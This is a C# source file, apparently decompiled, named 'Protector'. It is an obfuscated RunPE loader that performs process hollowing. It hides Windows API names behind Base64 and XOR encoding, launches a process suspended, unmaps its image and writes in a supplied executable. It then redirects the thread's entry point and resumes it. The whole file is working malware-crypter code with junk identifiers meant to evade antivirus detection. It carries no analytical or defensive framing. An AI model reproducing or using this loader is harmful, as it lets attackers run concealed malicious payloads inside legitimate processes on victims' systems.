using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Protector;

[StandardModule]
internal sealed class Amtheone
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool HnKOojNdPHepoUtNSvtblQb(IntPtr vzpqfvvexwwdgwdsogv, uint[] gkrucwjfdblsouqbvofz);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool jKrVngXWHUlhbrFaOrsRQtl(IntPtr gqtvwedjpoiuwnrcgsdw, uint[] lwliipibdwuywqzfo);

	public delegate bool BipRWcIasULbgIrJHFlueJk(IntPtr xagcgdbjfapkbeni, IntPtr yfvcuspjntztqznxxvry, byte[] qzzcrjovbktzafzpzgb, uint zhiksdtpcetxdiloj, int eywyqdwnhjlshozg);

	public delegate IntPtr TFBDHkDsFRMSBGImQimRvNI(IntPtr yjwjwvxzenqoknpdx, IntPtr ahylzkvuqdqnvouekpow, IntPtr cseuivroipgzzekgwsoy, int cozrwjwhunrlqgrksvy, int blealkuffjbnitnrcrz);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool JTaQUmCDMvsBPAIaHiMkadg(IntPtr bxxrketjcrxcxtwbozaj, IntPtr ybxxtcfrppxvzzjszvye, ref IntPtr irzllcnlyfndqrcnifuj, int slnbgbpdeihgvsygea, ref IntPtr gpgxxatwxsbpfsaxazyt);

	public delegate uint kACuEhRJeQUNnILgIlbuKDo(IntPtr gukupvrkwazeuervvtda);

	public delegate uint aObLRkQRlvCtDCMTwlBRmTP(IntPtr cinabucaycgxdrzwerd, IntPtr phvigriqggqqjrlpt);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool lVWPDLJquIPjSVoHfMjkKjt(string ghfkghdkjghkfhg, StringBuilder ghfhgkjfhgkjhfkj, IntPtr vzieygtjepfnjkog, IntPtr xvinxvrdiuzfksud, [MarshalAs(UnmanagedType.Bool)] bool qubuihjssujbodegwyc, int rworgsobepbusnjejcf, IntPtr hdojdgnyrbjjpvfbv, string kxikpeiasoxqbtzgnhl, byte[] jnsfxrlicfsktvrlqbr, IntPtr[] oeehbrqsaxvvzzrkp);

	private static HnKOojNdPHepoUtNSvtblQb uXcOqYJidOpNTSZaIpTgpkZ = fjgohjsdogofgo<HnKOojNdPHepoUtNSvtblQb>("kernel32", "GetThreadContext");

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr handle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);

	public static T fjgohjsdogofgo<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(T));
	}

	private static object dAtagwTShoMVdAqWJvpljQo(string oMZqNdLkGMXSnVLbZ, string LZddHwReLAoRRSZQc)
	{
		string text = "";
		int num = Strings.Asc(LZddHwReLAoRRSZQc);
		checked
		{
			short num2 = (short)Strings.Len(oMZqNdLkGMXSnVLbZ);
			for (short num3 = 1; num3 <= num2; num3 = (short)unchecked(num3 + 1))
			{
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(oMZqNdLkGMXSnVLbZ, unchecked((int)num3), 1))));
			}
			return text;
		}
	}

	public static bool LvpTApnaJnJKmdVmtUbuPql(byte[] hfghgjdfhgjhdfg, string thsieyzqkzfvclacwp)
	{
		aObLRkQRlvCtDCMTwlBRmTP aObLRkQRlvCtDCMTwlBRmTP = fjgohjsdogofgo<aObLRkQRlvCtDCMTwlBRmTP>(Encoding.UTF8.GetString(Convert.FromBase64String("bnRkbGw=")), Encoding.UTF8.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")));
		checked
		{
			try
			{
				IntPtr zero = IntPtr.Zero;
				JTaQUmCDMvsBPAIaHiMkadg jTaQUmCDMvsBPAIaHiMkadg = fjgohjsdogofgo<JTaQUmCDMvsBPAIaHiMkadg>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")));
				IntPtr[] array = new IntPtr[4];
				TFBDHkDsFRMSBGImQimRvNI tFBDHkDsFRMSBGImQimRvNI = fjgohjsdogofgo<TFBDHkDsFRMSBGImQimRvNI>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")));
				byte[] jnsfxrlicfsktvrlqbr = new byte[68];
				BipRWcIasULbgIrJHFlueJk bipRWcIasULbgIrJHFlueJk = fjgohjsdogofgo<BipRWcIasULbgIrJHFlueJk>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String(Conversions.ToString(dAtagwTShoMVdAqWJvpljQo("'B;\u0001\u00156' \u0012\u001cH\u001b+)?\v%&'\u0005\u0013B;D", "qjLwJhdaCAPiTUafbTUIhNs")))));
				int num = BitConverter.ToInt32(hfghgjdfhgjhdfg, 60);
				jKrVngXWHUlhbrFaOrsRQtl jKrVngXWHUlhbrFaOrsRQtl = fjgohjsdogofgo<jKrVngXWHUlhbrFaOrsRQtl>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")));
				int num2 = BitConverter.ToInt16(hfghgjdfhgjhdfg, num + 6);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, num + 84));
				lVWPDLJquIPjSVoHfMjkKjt lVWPDLJquIPjSVoHfMjkKjt = fjgohjsdogofgo<lVWPDLJquIPjSVoHfMjkKjt>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")));
				kACuEhRJeQUNnILgIlbuKDo kACuEhRJeQUNnILgIlbuKDo = fjgohjsdogofgo<kACuEhRJeQUNnILgIlbuKDo>(Encoding.UTF8.GetString(Convert.FromBase64String("a2VybmVsMzI=")), Encoding.UTF8.GetString(Convert.FromBase64String(Conversions.ToString(dAtagwTShoMVdAqWJvpljQo("\u0014,\u0017;%\u0016p-\u0017\u0006)8\u001b\u0016\a*", "AnErUBPmSfWAfMaDTJKSNeb")))));
				if (lVWPDLJquIPjSVoHfMjkKjt(null, new StringBuilder(thsieyzqkzfvclacwp), zero, zero, qubuihjssujbodegwyc: false, 4, zero, null, jnsfxrlicfsktvrlqbr, array))
				{
					uint[] array2 = new uint[179];
					array2[0] = 65538u;
					if (uXcOqYJidOpNTSZaIpTgpkZ(array[1], array2))
					{
						IntPtr ybxxtcfrppxvzzjszvye = new IntPtr(unchecked((long)array2[41]) + 8L);
						IntPtr irzllcnlyfndqrcnifuj = IntPtr.Zero;
						IntPtr intPtr2 = new IntPtr(4);
						IntPtr gpgxxatwxsbpfsaxazyt = IntPtr.Zero;
						if (jTaQUmCDMvsBPAIaHiMkadg(array[0], ybxxtcfrppxvzzjszvye, ref irzllcnlyfndqrcnifuj, (int)intPtr2, ref gpgxxatwxsbpfsaxazyt) && unchecked((long)aObLRkQRlvCtDCMTwlBRmTP(array[0], irzllcnlyfndqrcnifuj)) == 0L)
						{
							IntPtr yfvcuspjntztqznxxvry = tFBDHkDsFRMSBGImQimRvNI(ahylzkvuqdqnvouekpow: new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, num + 52)), cseuivroipgzzekgwsoy: new IntPtr(BitConverter.ToInt32(hfghgjdfhgjhdfg, num + 80)), yjwjwvxzenqoknpdx: array[0], cozrwjwhunrlqgrksvy: 12288, blealkuffjbnitnrcrz: 64);
							int num3 = yfvcuspjntztqznxxvry.ToInt32();
							int eywyqdwnhjlshozg = default(int);
							bipRWcIasULbgIrJHFlueJk(array[0], yfvcuspjntztqznxxvry, hfghgjdfhgjhdfg, (uint)(int)intPtr, eywyqdwnhjlshozg);
							int num4 = num2 - 1;
							int num5 = num4;
							for (int i = 0; i <= num5; i++)
							{
								int[] array3 = new int[10];
								Buffer.BlockCopy(hfghgjdfhgjhdfg, num + 248 + i * 40, array3, 0, 40);
								byte[] array4 = new byte[array3[4] - 1 + 1];
								Buffer.BlockCopy(hfghgjdfhgjhdfg, array3[5], array4, 0, array4.Length);
								bipRWcIasULbgIrJHFlueJk(yfvcuspjntztqznxxvry: new IntPtr(num3 + array3[3]), zhiksdtpcetxdiloj: (uint)(int)new IntPtr(array4.Length), xagcgdbjfapkbeni: array[0], qzzcrjovbktzafzpzgb: array4, eywyqdwnhjlshozg: eywyqdwnhjlshozg);
							}
							bipRWcIasULbgIrJHFlueJk(yfvcuspjntztqznxxvry: new IntPtr(unchecked((long)array2[41]) + 8L), zhiksdtpcetxdiloj: (uint)(int)new IntPtr(4), xagcgdbjfapkbeni: array[0], qzzcrjovbktzafzpzgb: BitConverter.GetBytes(yfvcuspjntztqznxxvry.ToInt32()), eywyqdwnhjlshozg: eywyqdwnhjlshozg);
							array2[44] = (uint)(yfvcuspjntztqznxxvry.ToInt32() + BitConverter.ToInt32(hfghgjdfhgjhdfg, num + 40));
							jKrVngXWHUlhbrFaOrsRQtl(array[1], array2);
						}
					}
					kACuEhRJeQUNnILgIlbuKDo(array[1]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
